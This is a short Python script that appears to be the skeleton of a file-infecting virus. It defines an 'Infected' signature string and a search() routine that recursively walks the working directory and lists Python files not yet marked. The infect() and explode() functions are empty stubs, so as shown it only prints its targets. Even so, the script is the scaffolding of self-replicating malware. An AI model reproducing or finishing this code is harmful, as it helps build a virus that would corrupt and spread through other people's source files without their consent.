import os
import inspect

sigData = 'Infected'

def search(path):
    filesToInfect = []
    fileList = os.listdir(path)
    for fileName in fileList:
        if os.path.isdir(path + os.path.sep + fileName):
            filesToInfect.extend(search(path + os.path.sep + fileName))
        elif fileName[-3:] == '.py':
            infected = False
            for line in open(path + os.path.sep + fileName):
                if sigData in line:
                    infected = True
                    break
            if infected == False:
                filesToInfect.append(path + os.path.sep + fileName)
    return filesToInfect

def infect(filesToInfect):
    pass

def explode():
    pass

print(search(os.getcwd()))